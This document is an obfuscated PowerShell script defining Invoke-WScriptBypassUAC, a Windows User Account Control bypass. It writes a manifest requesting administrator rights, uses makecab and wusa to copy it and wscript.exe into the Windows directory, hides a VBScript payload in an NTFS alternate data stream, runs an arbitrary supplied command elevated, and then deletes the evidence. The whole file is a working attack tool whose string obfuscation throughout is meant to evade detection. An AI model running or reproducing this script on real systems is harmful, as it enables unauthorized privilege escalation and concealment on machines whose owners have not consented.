 &("{0}{1}{2}"-f's','E','t-itEm')  vaRiAblE:AB1l ([TYpe]("{2}{1}{0}"-F'Io.pAtH','Em.','SYsT') ); $crW7=  [TypE]("{1}{0}"-f 'EgEX','R')  ;  &('Sv') ('CNL'+'I'+'h0') ( [TYpE]("{2}{0}{1}"-F 'PpdOM','AIN','A') )  ;   &('SV')  WkM7 ( [Type]("{8}{6}{5}{2}{1}{3}{4}{0}{9}{7}"-F'A','.ASSEMB','TiON.eMit','lYBUi','lDer','ec','Fl','CEss','RE','c'))  ;   &("{2}{1}{0}" -f 'm','T-Ite','sE') VariABle:FCxIDO ([typE]("{8}{9}{3}{4}{1}{5}{7}{2}{0}{6}"-F'MpOrtATT','s','i','pSer','VIce','.','riBUTe','Dll','R','untIme.iNtero')  );  $B9Y6Gm = [TYPE]("{2}{5}{4}{0}{3}{1}" -F'ethodat','RIBUTes','Re','t','on.M','fleCtI'); &('sv') u1qkh2 ([TyPe]("{3}{4}{2}{1}{0}" -F'iONs','vEnT','on','reFleCTioN.','cAlLinGC') );    &("{1}{2}{0}" -f 'bLe','SeT-','VAria') 2Vxf15  ([tYPe]("{0}{7}{3}{6}{4}{8}{2}{5}{1}" -F'RunTi','IOn','onv','.iNT','o','EnT','er','me','pSErviCes.CallInGC')  )  ;    $PBM8l= [tyPe]("{1}{3}{5}{2}{4}{0}"-f'eRViceS.CHarseT','run','mE.iNTEr','T','opS','I')  ;&("{0}{2}{1}"-f'SE','-Item','t') ("VArIabLe"+":rb"+"p")  ( [TYPE]("{1}{2}{0}"-F 'MEnt','eNvI','rOn')  )  ;  &("{2}{1}{0}"-f'iTEM','-','sEt') variABLE:98Z (  [TYpE]("{2}{0}{8}{1}{4}{3}{7}{6}{5}" -F 'ecURITY','pRiNCIpa','s','IndOWsid','l.w','ty','I','ent','.')  ); function iN`VOK`E-w`ScRIPTBYP`ASSuAc
{
    

    [CmdletBinding()]
    Param(
        [Parameter(mAnDatory=${Tr`Ue})]
        [string]
        ${pAy`lo`AD}
    )

    function lo`CAl:g`Et-T`empF`IlenaME {
        
        ${STEMpf`ol`DEr} = ${e`NV`:tE`mp}
        ${SteM`pFOL`d`Er} = ${STEm`Pf`ol`dER} + "\"
        ${stE`MPfI`lE`NAme} =  $ab1l::("{1}{2}{4}{3}{0}" -f 'Name','GetR','and','ile','omF').Invoke() + ("{0}{1}" -f '.t','mp')
        ${ste`m`pFI`LenA`mE} = ${ste`MPfI`LE`NaME} -split '\.',(  ( &("{0}{1}"-f'd','Ir')  ('vaRiAB'+'lE:C'+'rw'+'7')  )."V`AlUe"::("{1}{0}"-f'hes','matc').Invoke(${StEm`Pf`IlenaME},"\.")."Co`UNT") -join ''
        ${STE`M`PfILEnam`eF`i`Nal} = ${S`TeM`pfoLdEr} + ${S`T`eMpFIL`eNA`Me} 
        return ${S`Tem`p`File`NAME`FI`NaL}
    }

    function loc`AL:iNv`OK`E-COpYFile(${S`SOU`Rce}, ${st`A`RGet}) {
       
       ${sTe`MP`FIle} = &("{1}{3}{0}{2}"-f 'pFi','G','leName','et-Tem')
       &("{2}{1}{3}{0}"-f 'ess','art-P','St','roc') -WindowStyle ("{0}{1}"-f'Hidde','n') -FilePath "$($env:WINDIR)\System32\makecab.exe" -ArgumentList ("$sSource "+"$sTempFile")
       ${Nu`lL} = &("{1}{0}" -f'a','wus') "$sTempFile" ((("{2}{1}{5}{6}{4}{0}{3}"-f 'QsTarge','xtra','/e','t','z','ct:','t'))-rEpLace'tzQ',[Char]36) ("{1}{0}" -f'iet','/qu')

       
       &("{2}{0}{1}" -f 'art-','Sleep','St') -s 2
       
       
       &("{0}{1}{2}"-f'R','e','move-Item') ${S`TeM`pfiLE}
   }

    function lo`CaL:i`NV`OkE-w`sc`RipT`TrIgGer {
        
        ${Vb`s`Fil`Ename} =  ( &("{0}{2}{1}" -f 'VaRia','Le','b')  ab1l )."Va`lUE"::("{1}{0}{2}{3}"-f 'do','GetRan','mF','ileName').Invoke() + ("{1}{0}" -f'bs','.v')
        ${ad`sf`iLE} = ${V`BsF`ILEn`AmE} -split '\.',(  (&('LS')  vaRiABLE:CRw7  )."Val`UE"::("{0}{1}{2}"-f 'm','at','ches').Invoke(${vBsFILE`NA`Me},"\.")."CO`Unt") -join ''

        ${V`B`Sp`AYload} = ("{0}{1}{2}"-f'Dim ','o','bjShell:')
        ${vbsPa`y`L`Oad} += ("{1}{0}{2}{3}"-f'im o','D','Fs','o:')
        ${VbsPA`yL`OAd} += ((("{5}{10}{8}{15}{14}{0}{12}{2}{7}{9}{6}{13}{11}{4}{3}{1}" -f'(yKU','U):','KU','tyKUyK','eSystemObjec','Set o','n','Sc','o = Cre','ripti','Fs','.Fil','y','g','t','ateObjec'))  -rePLace([CHar]121+[CHar]75+[CHar]85),[CHar]34)
        ${V`BSPaYlo`AD} += ((("{5}{10}{7}{3}{6}{14}{0}{12}{9}{13}{1}{8}{4}{11}{15}{2}" -f'.C','bjec','ll{0}{0}):','ll ','}','Set','= W','She','t({0','e',' obj','{0}WScript.Sh','reat','O','Script','e'))  -f [CHaR]34)
        ${vBs`Pay`LOaD} += ('comm'+'and'+' '+'= '+"""$payload"":")
        ${vB`SPa`YLoaD} += ("{2}{4}{5}{1}{3}{0}" -f' 0:','m','o','and,','bj','Shell.Run com')
        
        
        ${d`eL`CO`MmaND} = "$($env:WINDIR)\System32\cmd.exe /c """"start /b """""""" cmd /c """"timeout /t 5 >nul&&del $($env:WINDIR)\wscript.exe&&del $($env:WINDIR)\wscript.exe.manifest"""""""" "
        ${vbSPa`y`L`OAD} += ('co'+'mm'+'and '+'= '+"""$DelCommand"":")
        ${vbS`paY`LoaD} += ("{5}{2}{1}{0}{4}{3}" -f'nd','ma','un com',' 0:',',','objShell.R')
        ${vb`SPA`YLOad} += ("{3}{1}{2}{4}{5}{0}"-f'ing',' ','objShell ','Set','=',' Noth')

        ${CR`Ea`T`ewraPPER`AdS} = {&("{0}{1}"-f 'c','md') ('/C') ('echo'+' '+"$VBSPayload "+'> '+"""$env:USERPROFILE\AppData:$ADSFile""")}
        &("{2}{0}{1}{3}" -f'nvo','ke-C','I','ommand') -ScriptBlock ${c`ReATEWRa`p`PE`R`ADS}
        
        ${exe`cuTESc`R`IpT} = {&("{1}{0}"-f 'md','c') ('/C') "$($env:WINDIR)\wscript.exe ""$env:USERPROFILE\AppData:$ADSFile"" "}
        &("{3}{1}{0}{2}"-f'omm','oke-C','and','Inv') -ScriptBlock ${Ex`Ecu`TESCr`i`Pt}
        &("{3}{0}{1}{2}" -f'o','ve-AD','S','Rem') ((("{2}{5}{6}{7}{3}{1}{4}{0}"-f 'NADSFile','WAppDat','I','R','a:I1','1Nenv:U','SER','PROFILEc')) -CrePlaCe ([chAR]73+[chAR]49+[chAR]78),[chAR]36  -rEPLace  ([chAR]99+[chAR]82+[chAR]87),[chAR]92)
    }

    function loCa`L:invO`KE-`W`sCr`IPT`El`evaTE {

        ${W`ScR`iptMANIFE`St} =
((("{55}{91}{4}{110}{159}{95}{150}{148}{164}{176}{88}{22}{74}{26}{46}{140}{125}{100}{14}{18}{48}{143}{92}{93}{127}{82}{17}{3}{156}{62}{87}{181}{76}{20}{67}{169}{128}{66}{121}{112}{8}{151}{118}{173}{161}{47}{138}{158}{137}{108}{51}{58}{97}{38}{53}{34}{61}{174}{160}{142}{145}{178}{73}{135}{101}{45}{167}{157}{175}{94}{134}{28}{90}{86}{109}{80}{36}{114}{2}{116}{171}{25}{180}{147}{146}{77}{81}{154}{117}{115}{152}{155}{162}{19}{83}{65}{104}{31}{54}{106}{49}{7}{102}{166}{40}{33}{172}{79}{60}{98}{139}{170}{136}{64}{129}{131}{24}{42}{149}{9}{72}{119}{133}{52}{27}{63}{122}{113}{153}{32}{99}{107}{10}{132}{68}{56}{126}{70}{124}{85}{50}{165}{30}{1}{141}{39}{69}{21}{89}{130}{44}{123}{35}{13}{59}{168}{179}{23}{163}{11}{16}{15}{144}{103}{6}{41}{84}{29}{177}{43}{57}{111}{5}{12}{105}{0}{120}{37}{71}{78}{75}{96}" -f 'p','ind','
 ','m.v1','ve','sSettings>
  </a','/d','r',':a','3:ap','p://s','a','s','oEl',' xm','  ','te>
',':as','l','BE ui','sch','E','-8jBE standalone','/autoEl','>','  ','B','asmv','u','ware','2005/W','EfalsejBE/>
','j','dPri','on','t','ge','cat','r','tti','e','p','
  <asm','
  ','     <a','nfo','EyesjBE?>
<as','   ','ns=jBEur','  </','S','t','
    <','si','  ','jBE
','.mi','  </asmv3:win','V','ev','ri','=','E','3:win','t','ccess','so','e','mas','ngsjB','ft','ion','pl',' <asmv','=j','as','ns:asmv3=jBEurn:','l=','>
</',' </secu','e','jBERe','-com','A','iA','/','edPrivi','
          ','TF','>
','est','<?xml ',':sch','emas-microsof',' <re','0jBE','sembly>
jBE','e','ty>
  <','B','y','I','e','>true<','=jB','mv3:ap','  ','Ehtt','nifes','l','rs','dow','com','ettings','s>','re','   ','ui','m.v3','i','li','ft-','dowsS','u','.com','bl','croso','t','as-micro','ru',' ','stInfo','che','cation>','q','3:trust','v3:',' ma',' ','/as','sem','owsSe','E1.0','n','    <dpiAware','jBE','nLevel leve','xecutio','enc','v',' ','s','Administrat',' xmlns=','q','o','jB','security>','  ','ion=jBE1.','B','  ','rj','ev','oding','MI/','quest','>
    <','ate>tru','m','m',' ','vileges>
   ','jBE
 ','j','
     ','=jBEU','>','>
 ','e<',' <requestedE','xml')) -REpLacE 'jBE',[ChAr]34)

        
        ${s`manIfe`St} = ${en`V:TE`mP} + ((("{1}{3}{2}{5}{4}{0}"-f 'est','5gMwsc','e','ript.','e.manif','x'))."rE`pLaCE"(([CHaR]53+[CHaR]103+[CHaR]77),'\'))
        ${W`Scr`iPtMANiFE`ST} | &("{2}{1}{0}" -f 'ile','t-F','Ou') ${s`mA`N`IFEst} -Encoding ("{1}{0}"-f'F8','UT')

        &("{0}{4}{3}{2}{1}"-f 'I','le','-CopyFi','oke','nv') ${smA`NIFe`sT} ${e`N`V:wiNDIr}

        ${wSCR`iPT`P`ATh} = "$($env:WINDIR)\System32\wscript.exe"
        &("{2}{3}{4}{1}{0}"-f 'le','Fi','I','n','voke-Copy') ${wSC`R`iPtP`ATH} ${eN`V:Wi`Nd`ir}
        &("{0}{2}{1}" -f'Rem','-Item','ove') -Force ${Sma`NiF`EST}

        
        &("{5}{2}{0}{1}{3}{4}" -f'sc','ript','-W','Tri','gger','Invoke')
    }

    function loC`AL:re`Mo`VE-Ads {
        
        [CmdletBinding()] Param(
            [Parameter(MAndaTorY=${TR`UE})]
            [string]${Ads`P`Ath}
        )
     
        
        
        ${dYN`A`SSEMBLy} = &("{1}{2}{0}" -f'ect','N','ew-Obj') ("{1}{2}{0}{3}{5}{4}" -f 'on.As','System.','Reflecti','sem','lyName','b')(("{0}{1}"-f'W','in32'))
        ${asS`Em`BlyBuI`LDER} =  (&("{0}{3}{2}{1}" -f 'g','bLE','RIA','Et-va') ('cnL'+'i'+'H0')  -valueO)::"current`Dom`A`iN".("{5}{4}{1}{2}{3}{0}"-f'bly','Dyn','am','icAssem','efine','D').Invoke(${d`YNass`eMbLY},  (  &("{0}{1}{2}" -f 'get-vA','riab','LE')  wkm7 -VaLU  )::"r`Un")
        ${mo`dU`l`EBUiL`DeR} = ${AS`Se`m`BLyBUildEr}.("{4}{3}{5}{2}{0}{1}{6}"-f 'Dy','nam','ne','e','D','fi','icModule').Invoke(("{0}{1}" -f 'W','in32'), ${F`Al`sE})
     
        ${T`YpeB`UIlDEr} = ${M`ODU`l`EbUildeR}.("{0}{3}{1}{2}"-f'Def','eTy','pe','in').Invoke(("{3}{2}{1}{0}" -f 'el32','.Kern','in32','W'), ("{4}{2}{1}{3}{0}"-f'ss','C','ublic, ','la','P'))
        ${D`LlimPO`RT`CON`S`Tr`UCtor} =   (&("{1}{0}"-f 'tEm','i') vArIablE:FcxIdo)."V`ALue"."gEt`cOnSTRU`ct`OR"(@([String]))
        ${s`etlA`STEr`R`Or} =  $FcXIdo.("{2}{1}{0}" -f'ield','etF','G').Invoke(("{1}{3}{2}{0}"-f 'ror','S','Er','etLast'))
        ${SeT`lAsTerRORcUsto`M`AT`TR`I`Bute} = &("{3}{0}{2}{1}" -f 'w-','t','Objec','Ne') ("{1}{3}{0}{2}{4}{5}{6}" -f'tion','Ref','.Emit.CustomA','lec','ttribu','te','Builder')(${DllI`mPoR`TCOns`TR`UCt`Or},
            @(("{2}{1}{3}{0}"-f 'll','r','ke','nel32.d')),
            [Reflection.FieldInfo[]]@(${set`lastER`ROr}),
            @(${tr`UE}))
     
        
        ${PI`Nv`OkEm`eTHoD} = ${tYp`eBUi`lDEr}.("{4}{5}{3}{2}{0}{1}"-f 'e','Method','Invok','P','Defi','ne').Invoke(("{2}{0}{1}" -f'elete','File','D'),
            ("{0}{1}{3}{2}"-f 'k','ernel32','dll','.'),
            (  $b9Y6gM::"PuB`LIC" -bor   $b9y6GM::"sT`ATic"),
              $u1qKh2::"STAN`DArd",
            [Bool],
            [Type[]]@([String]),
             (  &("{3}{1}{2}{0}" -f 'rIabLe','-','Va','GET') 2vXf15 -vaLUeOnl  )::"w`INapi",
             ( &("{1}{2}{0}" -f 'em','Get-CH','ilDIT')  ("variaBlE"+":P"+"bM8l") )."Val`Ue"::"A`NSi")
        ${PiN`Vo`keMe`ThOD}.("{5}{4}{2}{3}{1}{0}"-f 'mAttribute','o','t','Cust','e','S').Invoke(${se`T`l`A`StERr`ORcUSt`o`MaT`TribuTE})
        
        ${k`eRneL32} = ${T`YPE`BUIld`er}.("{0}{2}{1}" -f'Creat','pe','eTy').Invoke()
        
        ${ReS`U`lt} = ${keR`N`EL32}::("{3}{2}{0}{1}" -f'e','File','elet','D').Invoke(${aDSP`ATH})

        if (${R`e`SuLT}){
            &("{2}{0}{1}"-f 'e-Verbo','se','Writ') ('Alt'+'er'+'nate '+'Data'+' '+'S'+'trea'+'m '+'a'+'t '+"$ADSPath "+'successfu'+'l'+'ly '+'remo'+'v'+'ed.')
        }
        else{
            &("{1}{3}{0}{2}"-f'ite-V','W','erbose','r') ('Alt'+'er'+'nate'+' '+'Dat'+'a '+'Stream'+' '+'a'+'t '+"$ADSPath "+'re'+'moval'+' '+'f'+'ailu'+'re!')
        }
    }

    
    ${OS`VER`Si`On} =   $RBP::"oSv`eR`SIOn"."vers`I`on"
    if ((${OSv`ErsI`ON} -ge (&("{1}{0}{2}" -f 'ew-Obj','N','ect') ("{0}{1}" -f 'Versi','on') 6,0)) -and (${Osve`Rs`ION} -lt (&("{2}{0}{1}"-f'ew-Objec','t','N') ("{0}{2}{1}"-f'V','rsion','e') 6,2))){
        if(([Security.Principal.WindowsPrincipal]   (  &("{1}{0}"-f 'TEm','i') VaRIablE:98Z )."vaL`UE"::("{1}{0}{2}"-f 'r','GetCur','ent').Invoke())."isI`N`RoLe"([Security.Principal.WindowsBuiltInRole] ("{2}{3}{1}{0}" -f 'rator','st','Ad','mini')) -eq ${T`RUe}){
            ("{3}{2}{1}{5}{0}{4}{6}" -f' a','u','o','[!] WARNING: Y','lready el',' are','evated!')
        }
        else {
            &("{2}{0}{3}{1}"-f 'Ws','iptElevate','Invoke-','cr')
        }
    }else{("{3}{5}{2}{1}{4}{0}"-f 't Not Vulnerable','Targ',': ','[!] WAR','e','NING')}
}